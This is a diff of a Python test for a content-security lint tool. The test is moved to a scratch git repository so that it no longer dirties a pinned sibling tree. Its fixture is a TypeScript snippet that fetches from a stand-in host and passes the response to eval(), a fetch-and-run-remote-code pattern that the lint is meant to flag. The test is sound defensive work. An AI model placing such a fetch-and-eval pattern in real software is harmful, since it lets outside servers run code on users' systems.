@@ -291,24 +291,67 @@ def test_csp_lint_real_passes():
 
 
 def test_csp_lint_bans_network_and_eval_in_ui(tmp_path):
-    # Write a rogue ui view into a COPY of the real ui tree so the runtime-
-    # egress law bites (the tool scans the xr-core ui root by default, so point
-    # a fixture through a mirrored tree the tool can see).
-    ui = XR_CORE / "ui"
-    bad = ui / "_lint_fixture_bad.ts"
-    try:
-        bad.write_text(
-            "// Copyright 2026 RRRTX Labs\n"
-            "export async function load() {\n"
-            "  const r = await fetch('https://example.com');\n"  # runtime egress
-            "  eval(r.text);\n"
-            "  return r;\n}\n", encoding="utf-8")
-        r = run("csp_lint.py")
-        assert r.returncode == 1, "csp_lint must fail on fetch(/eval( in ui/**"
-        assert "fetch(" in r.stdout and "eval(" in r.stdout
-    finally:
-        bad.unlink(missing_ok=True)
-    assert run("csp_lint.py").returncode == 0  # clean again
+    """A rogue view reddens the egress law — in a SCRATCH sibling, never the pin.
+
+    This test used to write `_lint_fixture_bad.ts` into the CHECKED-OUT sibling
+    and delete it afterwards. Two things were wrong with that, and P13-C-P0.2
+    turned the first into a red test rather than a comment:
+
+      * it made the pinned tree dirty for the duration of the test, so every
+        lane that reads the sibling (now guarded by the pin law) saw a tree that
+        was not the pinned tree — the assertion came back DIRTY-SIBLING, which
+        is the law doing its job;
+      * "tests never write into the repo tree" applies to the sibling too: a
+        crash mid-test would have left a rogue view in the dependency.
+
+    So the fixture builds its own tiny world: a scratch git sibling, committed
+    (HEAD == the pin recorded in the scratch repo's DEPS, worktree clean), then
+    the file is removed in a second commit and DEPS follows. The law is
+    satisfied at every step and the SUBJECT — does the egress lint bite? — is
+    what the assertions test.
+    """
+    repo = tmp_path / "repo"
+    sib = tmp_path / "xr-core"
+    (sib / "ui").mkdir(parents=True)
+    (repo).mkdir()
+    (sib / "ui" / "views.ts").write_text(
+        "// Copyright 2026 RRRTX Labs\nexport const views = 1;\n", encoding="utf-8")
+    bad = sib / "ui" / "_lint_fixture_bad.ts"
+    bad.write_text(
+        "// Copyright 2026 RRRTX Labs\n"
+        "export async function load() {\n"
+        "  const r = await fetch('https://example.com');\n"  # runtime egress
+        "  eval(r.text);\n"
+        "  return r;\n}\n", encoding="utf-8")
+
+    def _commit(message: str) -> str:
+        subprocess.run(["git", "-C", str(sib), "init", "-q"], check=True)
+        for k, v in (("user.email", "t@example.invalid"), ("user.name", "t")):
+            subprocess.run(["git", "-C", str(sib), "config", k, v], check=True)
+        subprocess.run(["git", "-C", str(sib), "add", "-A"], check=True)
+        subprocess.run(["git", "-C", str(sib), "commit", "-qm", message], check=True)
+        return subprocess.run(["git", "-C", str(sib), "rev-parse", "HEAD"],
+                              capture_output=True, text=True, check=True).stdout.strip()
+
+    def _pin(rev: str) -> None:
+        (repo / "DEPS").write_text(
+            'chromium_rev: "' + "0" * 40 + '"\nxr_core_rev: "' + rev + '"\n',
+            encoding="utf-8")
+
+    # `--ui-root` is csp_lint's own flag for the tree it scans (its sibling
+    # resolution, and therefore the pin law, is the DEFAULT path's business —
+    # tools/negatives/p13_c02.sh covers that side).
+    argv = ["--repo", str(repo), "--ui-root", str(sib / "ui")]
+    _pin(_commit("fixture: a rogue view lands"))
+    r = run("csp_lint.py", *argv)
+    assert r.returncode == 1, ("csp_lint must fail on fetch(/eval( in ui/**\n"
+                               + r.stdout + r.stderr)
+    assert "fetch(" in r.stdout and "eval(" in r.stdout
+
+    bad.unlink()
+    _pin(_commit("fixture: the rogue view is removed"))
+    r = run("csp_lint.py", *argv)
+    assert r.returncode == 0, r.stdout + r.stderr  # clean again
 
 
 # ---------------------------------------------------------------------------
